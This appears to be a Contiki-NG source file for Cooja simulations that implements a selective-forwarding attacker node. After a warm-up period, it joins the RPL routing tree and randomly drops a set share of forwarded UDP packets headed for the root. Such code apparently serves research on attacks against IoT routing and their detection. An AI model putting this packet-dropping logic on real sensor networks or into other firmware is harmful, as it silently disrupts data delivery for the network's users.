/*
 * attacker.c
 * - Selective Forwarding attacker for Contiki-NG (Cooja)
 * - Drops forwarded UDP packets to the root with probability
 */

#include "contiki.h"
#include "sys/log.h"

#include "net/netstack.h"
#include "net/ipv6/uip.h"
#include "net/ipv6/uipbuf.h"
#include "net/ipv6/uip-ds6.h"
#include "net/linkaddr.h"
#include "random.h"
#include "net/routing/routing.h"
#include "net/routing/rpl-lite/rpl.h"
#include "net/routing/rpl-lite/rpl-icmp6.h"

#include <stdint.h>

#define LOG_MODULE "ATTACK"
#define LOG_LEVEL LOG_LEVEL_INFO

#define UDP_PORT 8765

#ifndef ATTACK_DROP_PCT
#define ATTACK_DROP_PCT 50
#endif

#ifndef ATTACK_WARMUP_SECONDS
#define ATTACK_WARMUP_SECONDS WARMUP_SECONDS
#endif

static uip_ipaddr_t root_ipaddr;
static uint8_t attack_enabled;

static uint8_t
should_attack_drop(void)
{
  if(ATTACK_DROP_PCT == 0) {
    return 0;
  }
  if(ATTACK_DROP_PCT >= 100) {
    return 1;
  }
  return (random_rand() % 100) < ATTACK_DROP_PCT;
}

static uint8_t
is_forwarded_udp_to_root(void)
{
  uint8_t proto = 0;

  if(uip_ds6_is_my_addr(&UIP_IP_BUF->srcipaddr)) {
    return 0;
  }

  uipbuf_get_last_header(uip_buf, uip_len, &proto);
  if(proto != UIP_PROTO_UDP) {
    return 0;
  }

  if(UIP_UDP_BUF->destport != UIP_HTONS(UDP_PORT)) {
    return 0;
  }

  return uip_ipaddr_cmp(&UIP_IP_BUF->destipaddr, &root_ipaddr);
}

static enum netstack_ip_action
ip_output(const linkaddr_t *localdest)
{
  (void)localdest;

  if(!attack_enabled) {
    return NETSTACK_IP_PROCESS;
  }

  if(is_forwarded_udp_to_root() && should_attack_drop()) {
    LOG_WARN("drop fwd UDP to root\n");
    return NETSTACK_IP_DROP;
  }

  return NETSTACK_IP_PROCESS;
}

static struct netstack_ip_packet_processor packet_processor = {
  .process_input = NULL,
  .process_output = ip_output
};

PROCESS(attacker_process, "Selective Forwarding attacker");
AUTOSTART_PROCESSES(&attacker_process);

PROCESS_THREAD(attacker_process, ev, data)
{
  static struct etimer warmup_timer;
  static struct etimer dis_timer;

  (void)ev; (void)data;

  PROCESS_BEGIN();

  uip_ip6addr(&root_ipaddr, 0xaaaa,0,0,0,0,0,0,1);

  random_init();

  netstack_ip_packet_processor_add(&packet_processor);
  rpl_set_leaf_only(0);

  etimer_set(&dis_timer, 30 * CLOCK_SECOND);
  attack_enabled = 0;
  if(ATTACK_WARMUP_SECONDS > 0) {
    etimer_set(&warmup_timer, ATTACK_WARMUP_SECONDS * CLOCK_SECOND);
  } else {
    attack_enabled = 1;
    LOG_INFO("attack enabled: drop=%u%%\n", (unsigned)ATTACK_DROP_PCT);
  }

  while(1) {
    PROCESS_WAIT_EVENT();
    if(!attack_enabled && ATTACK_WARMUP_SECONDS > 0 && etimer_expired(&warmup_timer)) {
      attack_enabled = 1;
      LOG_INFO("attack enabled: drop=%u%%\n", (unsigned)ATTACK_DROP_PCT);
    }
    if(etimer_expired(&dis_timer)) {
      if(!NETSTACK_ROUTING.node_has_joined()) {
        LOG_INFO("send DIS (not joined)\n");
        rpl_icmp6_dis_output(NULL);
      }
      etimer_reset(&dis_timer);
    }
  }

  PROCESS_END();
}
